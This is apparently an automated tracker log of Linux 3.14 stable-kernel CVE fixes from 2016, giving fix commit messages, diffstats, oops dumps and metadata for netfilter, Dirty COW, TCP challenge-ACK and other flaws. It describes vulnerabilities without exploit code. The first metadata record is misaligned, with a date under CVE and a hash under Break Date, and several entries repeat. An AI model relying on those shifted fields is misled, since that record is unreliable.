The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: -
CVE: 2016-09-11
Break Date: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Break Commit: 3.14.79
Break Tag: -
Linus Fix Date: 2016-09-11
Linus Commit: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Linus Tag: 3.14.79
Stable Date: -
Stable Commit: 2016-09-11
Stable Tag: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8

CVE-2016-3134:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4997:
CVE-2016-4998:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.73.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 6e94e0cfb0887e4013b3b930fa6ab1fe6bb6ba91
Author: Florian Westphal <fw@strlen.de>
Date:   Tue Mar 22 18:02:50 2016 +0100

    netfilter: x_tables: make sure e->next_offset covers remaining blob size
    
    Otherwise this function may read data beyond the ruleset blob.
    
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 net/ipv4/netfilter/arp_tables.c |    6 ++++--
 net/ipv4/netfilter/ip_tables.c  |    6 ++++--
 net/ipv6/netfilter/ip6_tables.c |    6 ++++--
 3 files changed, 12 insertions(+), 6 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-3134
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-28
Linus Commit: 6e94e0cfb0887e4013b3b930fa6ab1fe6bb6ba91
Linus Tag: 4.6
Stable Date: 2016-06-24
Stable Commit: e0b84cd87763c3bd442a06942ca90a60a7e152e7
Stable Tag: 3.14.73

CVE-2016-3134:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4997:
CVE-2016-4998:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.73.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit bdf533de6968e9686df777dc178486f600c6e617
Author: Florian Westphal <fw@strlen.de>
Date:   Tue Mar 22 18:02:49 2016 +0100

    netfilter: x_tables: validate e->target_offset early
    
    We should check that e->target_offset is sane before
    mark_source_chains gets called since it will fetch the target entry
    for loop detection.
    
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 net/ipv4/netfilter/arp_tables.c |   17 ++++++++---------
 net/ipv4/netfilter/ip_tables.c  |   17 ++++++++---------
 net/ipv6/netfilter/ip6_tables.c |   17 ++++++++---------
 3 files changed, 24 insertions(+), 27 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-3134
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-28
Linus Commit: bdf533de6968e9686df777dc178486f600c6e617
Linus Tag: 4.6
Stable Date: 2016-06-24
Stable Commit: 411c8508d4d0cb1e75343da53aaf26764bf4b9fe
Stable Tag: 3.14.73

CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4997:
CVE-2016-4998:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.73.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit ce683e5f9d045e5d67d1312a42b359cb2ab2a13c
Author: Florian Westphal <fw@strlen.de>
Date:   Fri Apr 1 14:17:28 2016 +0200

    netfilter: x_tables: check for bogus target offset
    
    We're currently asserting that targetoff + targetsize <= nextoff.
    
    Extend it to also check that targetoff is >= sizeof(xt_entry).
    Since this is generic code, add an argument pointing to the start of the
    match/target, we can then derive the base structure size from the delta.
    
    We also need the e->elems pointer in a followup change to validate matches.
    
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 include/linux/netfilter/x_tables.h |    4 ++--
 net/ipv4/netfilter/arp_tables.c    |    5 +++--
 net/ipv4/netfilter/ip_tables.c     |    5 +++--
 net/ipv6/netfilter/ip6_tables.c    |    5 +++--
 net/netfilter/x_tables.c           |   17 +++++++++++++++--
 5 files changed, 26 insertions(+), 10 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-07-03
CVE: CVE-2016-4997
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-04-14
Linus Commit: ce683e5f9d045e5d67d1312a42b359cb2ab2a13c
Linus Tag: 4.7
Stable Date: 2016-06-24
Stable Commit: f216289025f02e99628d6783f251f3a9d1966cad
Stable Tag: 3.14.73

CVE-2016-3134:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4997:
CVE-2016-4998:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.73.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 6e94e0cfb0887e4013b3b930fa6ab1fe6bb6ba91
Author: Florian Westphal <fw@strlen.de>
Date:   Tue Mar 22 18:02:50 2016 +0100

    netfilter: x_tables: make sure e->next_offset covers remaining blob size
    
    Otherwise this function may read data beyond the ruleset blob.
    
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 net/ipv4/netfilter/arp_tables.c |    6 ++++--
 net/ipv4/netfilter/ip_tables.c  |    6 ++++--
 net/ipv6/netfilter/ip6_tables.c |    6 ++++--
 3 files changed, 12 insertions(+), 6 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-3134
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-28
Linus Commit: 6e94e0cfb0887e4013b3b930fa6ab1fe6bb6ba91
Linus Tag: 4.6
Stable Date: 2016-06-24
Stable Commit: e0b84cd87763c3bd442a06942ca90a60a7e152e7
Stable Tag: 3.14.73

CVE-2016-3134:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4997:
CVE-2016-4998:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.73.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit bdf533de6968e9686df777dc178486f600c6e617
Author: Florian Westphal <fw@strlen.de>
Date:   Tue Mar 22 18:02:49 2016 +0100

    netfilter: x_tables: validate e->target_offset early
    
    We should check that e->target_offset is sane before
    mark_source_chains gets called since it will fetch the target entry
    for loop detection.
    
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 net/ipv4/netfilter/arp_tables.c |   17 ++++++++---------
 net/ipv4/netfilter/ip_tables.c  |   17 ++++++++---------
 net/ipv6/netfilter/ip6_tables.c |   17 ++++++++---------
 3 files changed, 24 insertions(+), 27 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-3134
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-28
Linus Commit: bdf533de6968e9686df777dc178486f600c6e617
Linus Tag: 4.6
Stable Date: 2016-06-24
Stable Commit: 411c8508d4d0cb1e75343da53aaf26764bf4b9fe
Stable Tag: 3.14.73

CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4997:
CVE-2016-4998:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.73.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit ce683e5f9d045e5d67d1312a42b359cb2ab2a13c
Author: Florian Westphal <fw@strlen.de>
Date:   Fri Apr 1 14:17:28 2016 +0200

    netfilter: x_tables: check for bogus target offset
    
    We're currently asserting that targetoff + targetsize <= nextoff.
    
    Extend it to also check that targetoff is >= sizeof(xt_entry).
    Since this is generic code, add an argument pointing to the start of the
    match/target, we can then derive the base structure size from the delta.
    
    We also need the e->elems pointer in a followup change to validate matches.
    
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 include/linux/netfilter/x_tables.h |    4 ++--
 net/ipv4/netfilter/arp_tables.c    |    5 +++--
 net/ipv4/netfilter/ip_tables.c     |    5 +++--
 net/ipv6/netfilter/ip6_tables.c    |    5 +++--
 net/netfilter/x_tables.c           |   17 +++++++++++++++--
 5 files changed, 26 insertions(+), 10 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-07-03
CVE: CVE-2016-4997
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-04-14
Linus Commit: ce683e5f9d045e5d67d1312a42b359cb2ab2a13c
Linus Tag: 4.7
Stable Date: 2016-06-24
Stable Commit: f216289025f02e99628d6783f251f3a9d1966cad
Stable Tag: 3.14.73

CVE-2016-5195:
CVE-2016-5195:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619
Author: Linus Torvalds <torvalds@linux-foundation.org>
Date:   Thu Oct 13 13:07:36 2016 -0700

    mm: remove gup_flags FOLL_WRITE games from __get_user_pages()
    
    This is an ancient bug that was actually attempted to be fixed once
    (badly) by me eleven years ago in commit 4ceb5db9757a ("Fix
    get_user_pages() race for write access") but that was then undone due to
    problems on s390 by commit f33ea7f404e5 ("fix get_user_pages bug").
    
    In the meantime, the s390 situation has long been fixed, and we can now
    fix it by checking the pte_dirty() bit properly (and do it better).  The
    s390 dirty bit was implemented in abf09bed3cce ("s390/mm: implement
    software dirty bits") which made it into v3.9.  Earlier kernels will
    have to look at the page state itself.
    
    Also, the VM has become more scalable, and what used a purely
    theoretical race back then has become easier to trigger.
    
    To fix it, we introduce a new internal FOLL_COW flag to mark the "yes,
    we already did a COW" rather than play racy games with FOLL_WRITE that
    is very fundamental, and then use the pte dirty flag to validate that
    the FOLL_COW flag is still valid.
    
    Reported-and-tested-by: Phil "not Paul" Oester <kernel@linuxace.com>
    Acked-by: Hugh Dickins <hughd@google.com>
    Reviewed-by: Michal Hocko <mhocko@suse.com>
    Cc: Andy Lutomirski <luto@kernel.org>
    Cc: Kees Cook <keescook@chromium.org>
    Cc: Oleg Nesterov <oleg@redhat.com>
    Cc: Willy Tarreau <w@1wt.eu>
    Cc: Nick Piggin <npiggin@gmail.com>
    Cc: Greg Thelen <gthelen@google.com>
    Cc: stable@vger.kernel.org
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 include/linux/mm.h |    1 +
 mm/gup.c           |   14 ++++++++++++--
 2 files changed, 13 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-18
CVE: CVE-2016-5195
Break Date: 2007-05-07
Break Commit: 0a27a14a62921b438bb6f33772690d345a089be6
Break Tag: 2.6
Linus Fix Date: 2016-10-18
Linus Commit: 19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5243:
CVE-2016-5243:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 5d2be1422e02ccd697ccfcd45c85b4a26e6178e2
Author: Kangjie Lu <kangjielu@gmail.com>
Date:   Thu Jun 2 04:04:56 2016 -0400

    tipc: fix an infoleak in tipc_nl_compat_link_dump
    
    link_info.str is a char array of size 60. Memory after the NULL
    byte is not initialized. Sending the whole object out can cause
    a leak.
    
    Signed-off-by: Kangjie Lu <kjlu@gatech.edu>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/tipc/netlink_compat.c |    3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5243
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-06-02
Linus Commit: 5d2be1422e02ccd697ccfcd45c85b4a26e6178e2
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5244:
CVE-2016-5244:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.79.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 4116def2337991b39919f3b448326e21c40e0dbb
Author: Kangjie Lu <kangjielu@gmail.com>
Date:   Thu Jun 2 04:11:20 2016 -0400

    rds: fix an infoleak in rds_inc_info_copy
    
    The last field "flags" of object "minfo" is not initialized.
    Copying this object out may leak kernel stack data.
    Assign 0 to it to avoid leak.
    
    Signed-off-by: Kangjie Lu <kjlu@gatech.edu>
    Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/rds/recv.c |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5244
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-06-02
Linus Commit: 4116def2337991b39919f3b448326e21c40e0dbb
Linus Tag: 4.7
Stable Date: 2016-09-11
Stable Commit: d57906c6850c5bb9a93841da3deb6df53135d133
Stable Tag: 3.14.79

CVE-2016-5400:
CVE-2016-5400:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit aa93d1fee85c890a34f2510a310e55ee76a27848
Author: James Patrick-Evans <james@jmp-e.com>
Date:   Fri Jul 15 16:40:45 2016 +0100

    media: fix airspy usb probe error path
    
    Fix a memory leak on probe error of the airspy usb device driver.
    
    The problem is triggered when more than 64 usb devices register with
    v4l2 of type VFL_TYPE_SDR or VFL_TYPE_SUBDEV.
    
    The memory leak is caused by the probe function of the airspy driver
    mishandeling errors and not freeing the corresponding control structures
    when an error occours registering the device to v4l2 core.
    
    A badusb device can emulate 64 of these devices, and then through
    continual emulated connect/disconnect of the 65th device, cause the
    kernel to run out of RAM and crash the kernel, thus causing a local DOS
    vulnerability.
    
    Fixes CVE-2016-5400
    
    Signed-off-by: James Patrick-Evans <james@jmp-e.com>
    Reviewed-by: Kees Cook <keescook@chromium.org>
    Cc: stable@vger.kernel.org # 3.17+
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 drivers/media/usb/airspy/airspy.c |    3 +--
 1 file changed, 1 insertion(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-5400
Break Date: 2014-07-21
Break Commit: f3e775962ccbc62bd93f2200b82db88af05d0137
Break Tag: 3.17
Linus Fix Date: 2016-07-16
Linus Commit: aa93d1fee85c890a34f2510a310e55ee76a27848
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5412:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 93d17397e4e2182fdaad503e2f9da46202c0f1c3
Author: Paul Mackerras <paulus@ozlabs.org>
Date:   Wed Jun 22 15:52:55 2016 +1000

    KVM: PPC: Book3S HV: Save/restore TM state in H_CEDE
    
    It turns out that if the guest does a H_CEDE while the CPU is in
    a transactional state, and the H_CEDE does a nap, and the nap
    loses the architected state of the CPU (which is is allowed to do),
    then we lose the checkpointed state of the virtual CPU.  In addition,
    the transactional-memory state recorded in the MSR gets reset back
    to non-transactional, and when we try to return to the guest, we take
    a TM bad thing type of program interrupt because we are trying to
    transition from non-transactional to transactional with a hrfid
    instruction, which is not permitted.
    
    The result of the program interrupt occurring at that point is that
    the host CPU will hang in an infinite loop with interrupts disabled.
    Thus this is a denial of service vulnerability in the host which can
    be triggered by any guest (and depending on the guest kernel, it can
    potentially triggered by unprivileged userspace in the guest).
    
    This vulnerability has been assigned the ID CVE-2016-5412.
    
    To fix this, we save the TM state before napping and restore it
    on exit from the nap, when handling a H_CEDE in real mode.  The
    case where H_CEDE exits to host virtual mode is already OK (as are
    other hcalls which exit to host virtual mode) because the exit
    path saves the TM state.
    
    Cc: stable@vger.kernel.org # v3.15+
    Signed-off-by: Paul Mackerras <paulus@ozlabs.org>

 arch/powerpc/kvm/book3s_hv_rmhandlers.S |   13 +++++++++++++
 1 file changed, 13 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-5412
Break Date: 2014-03-29
Break Commit: e4e38121507a27d2ccc4b28d9e7fc4818a12c44c
Break Tag: 3.15
Linus Fix Date: 2016-07-28
Linus Commit: 93d17397e4e2182fdaad503e2f9da46202c0f1c3
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5412:
CVE-2016-5412:
3.15:
CVE-2016-5412:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit f024ee098476a3e620232e4a78cfac505f121245
Author: Paul Mackerras <paulus@ozlabs.org>
Date:   Wed Jun 22 14:21:59 2016 +1000

    KVM: PPC: Book3S HV: Pull out TM state save/restore into separate procedures
    
    This moves the transactional memory state save and restore sequences
    out of the guest entry/exit paths into separate procedures.  This is
    so that these sequences can be used in going into and out of nap
    in a subsequent patch.
    
    The only code changes here are (a) saving and restore LR on the
    stack, since these new procedures get called with a bl instruction,
    (b) explicitly saving r1 into the PACA instead of assuming that
    HSTATE_HOST_R1(r13) is already set, and (c) removing an unnecessary
    and redundant setting of MSR[TM] that should have been removed by
    commit 9d4d0bdd9e0a ("KVM: PPC: Book3S HV: Add transactional memory
    support", 2013-09-24) but wasn't.
    
    Cc: stable@vger.kernel.org # v3.15+
    Signed-off-by: Paul Mackerras <paulus@ozlabs.org>

 arch/powerpc/kvm/book3s_hv_rmhandlers.S |  449 ++++++++++++++++---------------
 1 file changed, 237 insertions(+), 212 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-5412
Break Date: 2014-03-29
Break Commit: e4e38121507a27d2ccc4b28d9e7fc4818a12c44c
Break Tag: 3.15
Linus Fix Date: 2016-07-28
Linus Commit: f024ee098476a3e620232e4a78cfac505f121245
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5696:
CVE-2016-5696:
CVE-2016-5696:
CVE-2016-5696:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.76.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 75ff39ccc1bd5d3c455b6822ab09e533c551f758
Author: Eric Dumazet <edumazet@google.com>
Date:   Sun Jul 10 10:04:02 2016 +0200

    tcp: make challenge acks less predictable
    
    Yue Cao claims that current host rate limiting of challenge ACKS
    (RFC 5961) could leak enough information to allow a patient attacker
    to hijack TCP sessions. He will soon provide details in an academic
    paper.
    
    This patch increases the default limit from 100 to 1000, and adds
    some randomization so that the attacker can no longer hijack
    sessions without spending a considerable amount of probes.
    
    Based on initial analysis and patch from Linus.
    
    Note that we also have per socket rate limiting, so it is tempting
    to remove the host limit in the future.
    
    v2: randomize the count of challenge acks per second, not the period.
    
    Fixes: 282f23c6ee34 ("tcp: implement RFC 5961 3.2")
    Reported-by: Yue Cao <ycao009@ucr.edu>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Suggested-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Acked-by: Yuchung Cheng <ycheng@google.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/ipv4/tcp_input.c |   15 ++++++++++-----
 1 file changed, 10 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-5696
Break Date: 2012-07-17
Break Commit: 282f23c6ee343126156dd41218b22ece96d747e3
Break Tag: 3.6
Linus Fix Date: 2016-07-11
Linus Commit: 75ff39ccc1bd5d3c455b6822ab09e533c551f758
Linus Tag: 4.7
Stable Date: 2016-08-16
Stable Commit: 860c53258e634c54f70252c352bae7bac30724a9
Stable Tag: 3.14.76

CVE-2016-5728:
CVE-2016-5728:
CVE-2016-5728:
9bf292bfca94694a721449e3fd752493856710f6:
CVE-2016-5728:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9bf292bfca94694a721449e3fd752493856710f6
Author: Ashutosh Dixit <ashutosh.dixit@intel.com>
Date:   Wed Apr 27 14:36:05 2016 -0700

    misc: mic: Fix for double fetch security bug in VOP driver
    
    The MIC VOP driver does two successive reads from user space to read a
    variable length data structure. Kernel memory corruption can result if
    the data structure changes between the two reads. This patch disallows
    the chance of this happening.
    
    Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=116651
    Reported by: Pengfei Wang <wpengfeinudt@gmail.com>
    Reviewed-by: Sudeep Dutt <sudeep.dutt@intel.com>
    Signed-off-by: Ashutosh Dixit <ashutosh.dixit@intel.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/misc/mic/vop/vop_vringh.c |    5 +++++
 1 file changed, 5 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5728
Break Date: 2013-09-26
Break Commit: f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5
Break Tag: 3.13
Linus Fix Date: 2016-04-27
Linus Commit: 9bf292bfca94694a721449e3fd752493856710f6
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5828:
CVE-2016-5828:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-5828:
CVE-2016-5828:
CVE-2016-5828:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.74.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 8e96a87c5431c256feb65bcfc5aec92d9f7839b6
Author: Cyril Bur <cyrilbur@gmail.com>
Date:   Fri Jun 17 14:58:34 2016 +1000

    powerpc/tm: Always reclaim in start_thread() for exec() class syscalls
    
    Userspace can quite legitimately perform an exec() syscall with a
    suspended transaction. exec() does not return to the old process, rather
    it load a new one and starts that, the expectation therefore is that the
    new process starts not in a transaction. Currently exec() is not treated
    any differently to any other syscall which creates problems.
    
    Firstly it could allow a new process to start with a suspended
    transaction for a binary that no longer exists. This means that the
    checkpointed state won't be valid and if the suspended transaction were
    ever to be resumed and subsequently aborted (a possibility which is
    exceedingly likely as exec()ing will likely doom the transaction) the
    new process will jump to invalid state.
    
    Secondly the incorrect attempt to keep the transactional state while
    still zeroing state for the new process creates at least two TM Bad
    Things. The first triggers on the rfid to return to userspace as
    start_thread() has given the new process a 'clean' MSR but the suspend
    will still be set in the hardware MSR. The second TM Bad Thing triggers
    in __switch_to() as the processor is still transactionally suspended but
    __switch_to() wants to zero the TM sprs for the new process.
    
    This is an example of the outcome of calling exec() with a suspended
    transaction. Note the first 700 is likely the first TM bad thing
    decsribed earlier only the kernel can't report it as we've loaded
    userspace registers. c000000000009980 is the rfid in
    fast_exception_return()
    
      Bad kernel stack pointer 3fffcfa1a370 at c000000000009980
      Oops: Bad kernel stack pointer, sig: 6 [#1]
      CPU: 0 PID: 2006 Comm: tm-execed Not tainted
      NIP: c000000000009980 LR: 0000000000000000 CTR: 0000000000000000
      REGS: c00000003ffefd40 TRAP: 0700   Not tainted
      MSR: 8000000300201031 <SF,ME,IR,DR,LE,TM[SE]>  CR: 00000000  XER: 00000000
      CFAR: c0000000000098b4 SOFTE: 0
      PACATMSCRATCH: b00000010000d033
      GPR00: 0000000000000000 00003fffcfa1a370 0000000000000000 0000000000000000
      GPR04: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
      GPR08: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
      GPR12: 00003fff966611c0 0000000000000000 0000000000000000 0000000000000000
      NIP [c000000000009980] fast_exception_return+0xb0/0xb8
      LR [0000000000000000]           (null)
      Call Trace:
      Instruction dump:
      f84d0278 e9a100d8 7c7b03a6 e84101a0 7c4ff120 e8410170 7c5a03a6 e8010070
      e8410080 e8610088 e8810090 e8210078 <4c000024> 48000000 e8610178 88ed023b
    
      Kernel BUG at c000000000043e80 [verbose debug info unavailable]
      Unexpected TM Bad Thing exception at c000000000043e80 (msr 0x201033)
      Oops: Unrecoverable exception, sig: 6 [#2]
      CPU: 0 PID: 2006 Comm: tm-execed Tainted: G      D
      task: c0000000fbea6d80 ti: c00000003ffec000 task.ti: c0000000fb7ec000
      NIP: c000000000043e80 LR: c000000000015a24 CTR: 0000000000000000
      REGS: c00000003ffef7e0 TRAP: 0700   Tainted: G      D
      MSR: 8000000300201033 <SF,ME,IR,DR,RI,LE,TM[SE]>  CR: 28002828  XER: 00000000
      CFAR: c000000000015a20 SOFTE: 0
      PACATMSCRATCH: b00000010000d033
      GPR00: 0000000000000000 c00000003ffefa60 c000000000db5500 c0000000fbead000
      GPR04: 8000000300001033 2222222222222222 2222222222222222 00000000ff160000
      GPR08: 0000000000000000 800000010000d033 c0000000fb7e3ea0 c00000000fe00004
      GPR12: 0000000000002200 c00000000fe00000 0000000000000000 0000000000000000
      GPR16: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
      GPR20: 0000000000000000 0000000000000000 c0000000fbea7410 00000000ff160000
      GPR24: c0000000ffe1f600 c0000000fbea8700 c0000000fbea8700 c0000000fbead000
      GPR28: c000000000e20198 c0000000fbea6d80 c0000000fbeab680 c0000000fbea6d80
      NIP [c000000000043e80] tm_restore_sprs+0xc/0x1c
      LR [c000000000015a24] __switch_to+0x1f4/0x420
      Call Trace:
      Instruction dump:
      7c800164 4e800020 7c0022a6 f80304a8 7c0222a6 f80304b0 7c0122a6 f80304b8
      4e800020 e80304a8 7c0023a6 e80304b0 <7c0223a6> e80304b8 7c0123a6 4e800020
    
    This fixes CVE-2016-5828.
    
    Fixes: bc2a9408fa65 ("powerpc: Hook in new transactional memory code")
    Cc: stable@vger.kernel.org # v3.9+
    Signed-off-by: Cyril Bur <cyrilbur@gmail.com>
    Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>

 arch/powerpc/kernel/process.c |   10 ++++++++++
 1 file changed, 10 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5828
Break Date: 2013-02-15
Break Commit: bc2a9408fa65195288b41751016c36fd00a75a85
Break Tag: 3.9
Linus Fix Date: 2016-06-27
Linus Commit: 8e96a87c5431c256feb65bcfc5aec92d9f7839b6
Linus Tag: 4.7
Stable Date: 2016-07-27
Stable Commit: ff19f63ed47309550b47831ac39176d9910fadfe
Stable Tag: 3.14.74

CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.74.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 93a2001bdfd5376c3dc2158653034c20392d15c5
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Thu Jun 23 08:59:47 2016 -0600

    HID: hiddev: validate num_values for HIDIOCGUSAGES, HIDIOCSUSAGES commands
    
    This patch validates the num_values parameter from userland during the
    HIDIOCGUSAGES and HIDIOCSUSAGES commands. Previously, if the report id was set
    to HID_REPORT_ID_UNKNOWN, we would fail to validate the num_values parameter
    leading to a heap overflow.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Jiri Kosina <jkosina@suse.cz>

 drivers/hid/usbhid/hiddev.c |   10 +++++-----
 1 file changed, 5 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5829
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-06-24
Linus Commit: 93a2001bdfd5376c3dc2158653034c20392d15c5
Linus Tag: 4.7
Stable Date: 2016-07-27
